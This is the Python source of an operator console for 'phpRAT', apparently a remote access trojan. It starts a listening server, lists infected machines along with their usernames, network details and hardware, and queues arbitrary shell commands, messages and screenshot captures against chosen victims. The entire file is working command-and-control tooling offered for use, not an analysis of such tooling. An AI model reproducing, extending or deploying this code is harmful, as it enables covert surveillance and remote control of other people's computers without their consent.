import logging
import threading
import cmd
from tabulate import tabulate
from datetime import datetime
import re
from tabulate import tabulate
import sys
import time
from os import system, name
from pyfiglet import Figlet
import random


class CLI(cmd.Cmd):

    intro = 'Welcome to phpRAT, use ? to see the commands\n'
    prompt = '(phpRAT) '
    machine_id = None
    modules = ['msg', 'cmd', 'screenshot']
    message = None
    command = None

    def get_curr_module(self):
        return re.search('\((.+?)\) ', self.prompt).group(1)

    def do_exit(self, args):
        '''Exit the program'''
        print("Exitting, Thanks for trying!")
        raise SystemExit

    def do_show(self, args):
        '''use `show item` to show items such as machines, queue etc.'''
        if len(args) == 0:
            print("Use help!")
            return
        if 'machine' in args:
            print('Showing machines')
            lock.acquire(True)
            db.c.execute('SELECT * FROM machines')
            machines = []
            for i in db.c.fetchall():
                k = list(i)
                if k[5]:
                    k[5] = k[5][:14]
                k[1] = datetime.fromtimestamp(int(k[1]))
                machines.append(k)
            print(tabulate(machines, headers=[
                "MachineID", "LastConnected", "OS", "Computer Name", "Username", "Network Info", "CPU", "RAM"]))
            lock.release()
        elif 'queue' in args:
            if self.machine_id:
                print(f"Showing Queue of {self.machine_id}:")
                print("===== Complete Tasks =====")
                lock.acquire(True)
                db.c.execute(
                    'SELECT * FROM queue WHERE machineId=? AND isComplete="true"', (self.machine_id, ))
                print(tabulate(db.c.fetchall()))
                print("===== Pending Tasks =====")
                db.c.execute(
                    'SELECT * FROM queue WHERE machineId=? AND isComplete="false"', (self.machine_id, ))
                print(tabulate(db.c.fetchall()))
                lock.release()
            else:
                print(f"Showing Queue:")
                print("===== Complete Tasks =====")
                lock.acquire(True)
                db.c.execute(
                    'SELECT * FROM queue WHERE isComplete="true"')
                print(tabulate(db.c.fetchall()))
                print("===== Pending Tasks =====")
                db.c.execute(
                    'SELECT * FROM queue WHERE isComplete="false"')
                print(tabulate(db.c.fetchall()))
                lock.release()
        elif 'options' in args:
            curr_module = self.get_curr_module()
            print()
            if curr_module == 'msg':
                options = [('machine', str(self.machine_id), 'True'),
                           ('message', str(self.message), 'True')]
                print(tabulate(options, headers=[
                      "Option", "Value", "Required"]), end='\n\n')
            elif curr_module == 'cmd':
                options = [('machine', str(self.machine_id), 'True'),
                           ('command', str(self.command), 'True')]
                print(tabulate(options, headers=[
                      "Option", "Value", "Required"]), end='\n\n')
            elif curr_module == 'screenshot':
                options = [('machine', str(self.machine_id), 'True')]
                print(tabulate(options, headers=[
                      "Option", "Value", "Required"]), end='\n\n')
        else:
            print("Use help!")

    def do_set(self, args):
        '''Set Value of Item'''
        args = args.split(' ')
        if len(args) < 2:
            print("Use help!")
        elif 'machine' in args[0]:
            self.machine_id = ' '.join(args[1:])
        elif 'message' in args[0]:
            self.message = ' '.join(args[1:])
        elif 'command' in args[0]:
            self.command = ' '.join(args[1:])
        else:
            print("Use help!")

    def do_unset(self, args):
        '''Unset Value of Item'''
        if len(args) == 0:
            print("Use help!")
            return
        if 'machine' in args:
            self.machine_id = None
            self.prompt = '(phpRAT) '

    def do_use(self, args):
        if len(args) == 0:
            print("Use help!")
            return
        if 'msg' in args:
            self.prompt = "(msg) "
        if 'cmd' in args:
            self.prompt = "(cmd) "
        if 'screenshot' in args:
            self.prompt = "(screenshot) "

    def do_execute(self, args):
        curr_module = self.get_curr_module()
        if curr_module == 'msg':
            if self.machine_id and self.message:
                task_id = queue.insert(
                    'msg', self.machine_id, args=[self.message])
                print(f"Added Task {task_id}")
            else:
                print("Check Options!")
        elif curr_module == 'cmd':
            if self.machine_id and self.command:
                task_id = queue.insert(
                    'cmd', self.machine_id, args=[self.command])
                print(f"Added Task {task_id}")
            else:
                print("Check Options!")
        elif curr_module == 'screenshot':
            if self.machine_id:
                task_id = queue.insert(
                    'screenshot', self.machine_id, args=[])
                print(f"Added Task {task_id}")
            else:
                print("Check Options!")
    def complete_show(self, text, line, begidx, endidx):
        args_len = 2
        completions = ['machines', 'queue']
        if self.get_curr_module() in self.modules:
            completions.append('options')

        if len(line.split(' ')) > args_len:
            return []

        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_set(self, text, line, begidx, endidx):
        args_len = 3
        if 'msg' in self.get_curr_module():
            completions = ['machine', 'message']
        elif 'cmd' in self.get_curr_module():
            completions = ['machine', 'command']
        elif 'screenshot' in self.get_curr_module():
            completions = ['machine']
        if 'machine' in line:
            lock.acquire(True)
            db.c.execute('SELECT machineId FROM machines')
            completions = [i[0] for i in db.c.fetchall()]
            lock.release()
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_unset(self, text, line, begidx, endidx):
        args_len = 2
        completions = ['machine']
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def complete_use(self, text, line, begidx, endidx):
        args_len = 2
        completions = self.modules
        if len(line.split(' ')) > args_len:
            return []
        mline = line.split(' ')[-1]
        offs = len(mline) - len(text)
        return [s[offs:] for s in completions if s.startswith(mline)]

    def completenames(self, text, *ignored):
        dotext = 'do_'+text
        commands = [a[3:] for a in self.get_names() if a.startswith(dotext)]
        use_commands = ['set', 'unset', 'execute']
        if self.get_curr_module() not in self.modules:
            commands = [
                command for command in commands if command not in use_commands]
        return commands[::-1]

    def emptyline(self):
        pass


if __name__ == "__main__":
    sys.path.insert(0, "./server")
    from baburao import app, queue, db, lock
    baburao_thread = threading.Thread(
        target=app.run, kwargs={'host': '0.0.0.0'}, daemon=True)
    baburao_thread.start()
    time.sleep(1)
    system('cls' if name == 'nt' else 'clear')
    fonts_list = ['basic', 'big', 'chunky','slant','epic','standard']
    font = random.choice(fonts_list)
    f = Figlet(font=font)
    print(f.renderText('phpRAT'))
    cli = CLI()
    cli.cmdloop()
